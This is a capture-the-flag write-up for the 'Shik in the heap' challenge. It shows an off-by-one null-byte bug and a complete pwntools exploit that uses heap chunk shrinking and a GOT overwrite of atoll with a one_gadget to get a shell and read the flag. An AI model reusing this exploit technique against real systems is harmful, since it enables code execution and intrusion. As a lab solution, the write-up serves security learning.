## Shik in the heap  

### Vulnerability
```
void read_input(char *buf,unsigned int size){
	int ret ;
	ret = __read_chk(0,buf,size,size);        // _read_chk will return the length of input
	if(ret <= 0){
		puts("read error");
		_exit(1);
	}
	buf[ret] = '\x00';      // Here overflow one byte with \x00
}
```
  
### Idea  
[Here you can see how to shrink the chunk](https://github.com/shinmao/WhyNot-HEAP-Exploitation/tree/master/Off-By-One)  
Then, I use the ```edit_shik``` function to make GOThijacking on atoll().  

### Payload  
```python
#!/usr/bin/env python
from pwn import *

DEBUG = 0
if DEBUG:
    p = process('./shik_in_the_heap-c91232e1d722aabfe747fcc5b22ed38a674fa3d8')
else:
    host = 'csie.ctf.tw'
    port = 10143
    p = remote(host,port)

e = ELF('./shik_in_the_heap-c91232e1d722aabfe747fcc5b22ed38a674fa3d8')
l = ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

def allocate(size, content):
    p.recvuntil('ice:')
    p.sendline('1')
    p.recvuntil('Size:')
    p.send(str(size)+'\n')
    p.recvuntil('Content:')
    p.send(content+'\n')

def dfree(idx):
    p.recvuntil('ice:')
    p.sendline('2')
    p.recvuntil('Index:')
    p.send(str(idx)+'\n')

def add(magic):
    p.recvuntil('ice:')
    p.sendline('3')
    p.recvuntil('magic :')
    p.send(magic+'\n')

def show():
    p.recvuntil('ice:')
    p.sendline('4')

def edit(magic):
    p.recvuntil('ice:')
    p.sendline('5')
    p.recvuntil('magic:')
    p.send(magic+'\n')

shik_ptr = 0x6020d0
heap_ptr = 0x6020e0

allocate(0x30,'ddaa')        #0
allocate(0x160,'a'*0xf0 + p64(0x100))   #1
allocate(0xf0,'ddaa')     #2

dfree(0)
dfree(1)

allocate(0x38,'a'*0x38)
allocate(0x80,'aaaa')

add('ddaa')     #shik

dfree(1)
dfree(2)

allocate(0x200,'a'*0x90 + p64(0x602058))
show()

p.recvuntil('Magic: ')
atol_adr = u64(p.recvline()[:-27].ljust(8,'\x00'))
libc = atol_adr - l.symbols['atoll']
log.success('libc address: %s' % hex(libc))

one_gadget = libc + 0xf1117
edit(p64(one_gadget))

p.recvuntil(':')
p.sendline('6')

sleep(1)
p.send('cat /home/`whoami`/flag' + '\n')

p.interactive()
```
